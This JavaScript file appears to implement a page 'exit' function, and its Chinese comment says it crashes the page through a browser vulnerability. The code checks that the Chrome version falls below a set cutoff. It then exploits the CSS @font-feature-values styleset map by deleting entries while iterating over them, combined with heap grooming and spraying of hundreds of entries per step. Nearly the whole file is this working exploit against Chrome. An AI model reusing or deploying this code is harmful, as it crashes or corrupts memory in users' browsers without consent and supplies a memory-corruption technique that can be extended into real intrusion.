"use strict";
//浏览器实在是没什么方法能退出页面了，我就只能用漏洞崩页面的方法退出了，这也没办法
function parseVersion(v) {
  const parts = v.split(".").map(Number);
  return {
    major: parts[0] || 0,
    minor: parts[1] || 0,
    build: parts[2] || 0,
    patch: parts[3] || 0,
    isDevBuild: (parts[2] === 0 && parts[3] === 0)
  };
}
function isVulnerable(vStr) {
  const v = parseVersion(vStr);
  if (v.isDevBuild) return false;
  if (v.major < 145) return true;
  if (v.major > 145) return false;
  if (v.build < 7632) return true;
  if (v.build > 7632) return false;
  return v.patch < 75;
}
function exit(){
const ua = navigator.userAgent;
const chromeMatch = ua.match(/Chrome\/([\d.]+)/);
const chromeVersion = chromeMatch ? chromeMatch[1] : "unknown";
if (!isVulnerable(chromeVersion)){
alert("你的浏览器版本不支持退出");
return;
}
const sheet = document.getElementById("target-style").sheet;
if (!sheet || sheet.cssRules.length === 0) {
  throw new Error("CSS rule not found");
}
const rule = sheet.cssRules[0];
const map = rule.styleset;
if (!map) {
  throw new Error("styleset not available");
}
const groomRules = [];
const groomStyle = document.createElement("style");
document.head.appendChild(groomStyle);
for (let i = 0; i < 50; i++) {
  groomStyle.sheet.insertRule(
    `@font-feature-values GroomFont${i} { @styleset { g${i}: ${i}; } }`,
    groomStyle.sheet.cssRules.length
  );
  groomRules.push(groomStyle.sheet.cssRules[groomStyle.sheet.cssRules.length - 1]);
}
let iterationCount = 0;
try {
  const iterator = map.entries();
  let step = 0;
  while (step < 20) {
    const result = iterator.next();
    if (result.done) {
      break;
    }
    const [key, value] = result.value;
    iterationCount++;
    map.delete(key);
    for (let i = 0; i < 512; i++) {
      map.set("spray_" + step + "_" + i, [i, i + 1, i + 2]);
    }
    for (let g = 0; g < groomRules.length; g++) {
      try {
        groomRules[g].styleset.set("reclaim_" + step + "_" + g, [step]);
      } catch(e) {}
    }
    step++;
  }
} catch (e) {
}

try {
  const style2 = document.createElement("style");
  document.head.appendChild(style2);
  style2.sheet.insertRule(
    `@font-feature-values AltFont {
      @styleset { x1: 10; x2: 20; x3: 30; x4: 40; x5: 50; }
    }`, 0
  );
  const rule2 = style2.sheet.cssRules[0];
  const map2 = rule2.styleset;
  let altCount = 0;
  for (const [k, v] of map2) {
    altCount++;
    map2.delete(k);
    for (let i = 0; i < 512; i++) {
      map2.set("alt_" + altCount + "_" + i, [i, i]);
    }
    if (altCount >= 5) break;
  }
} catch(e) {
}
const style3 = document.createElement("style");
document.head.appendChild(style3);
style3.sheet.insertRule(
  `@font-feature-values RafFont {
    @styleset { r1: 1; r2: 2; r3: 3; r4: 4; r5: 5; }
  }`, 0
);
const rule3 = style3.sheet.cssRules[0];
const map3 = rule3.styleset;
let rafCount = 0;
let rafIterator = map3.entries();
function rafTrigger() {
  if (rafCount >= 10) {
    return;
  }
  void document.body.offsetWidth;
  const result = rafIterator.next();
  if (!result.done) {
    const [k] = result.value;
    map3.delete(k);
    for (let i = 0; i < 512; i++) {
      map3.set("raf_" + rafCount + "_" + i, [rafCount, i]);
    }
  }
  rafCount++;
  requestAnimationFrame(rafTrigger);
}
requestAnimationFrame(rafTrigger)
}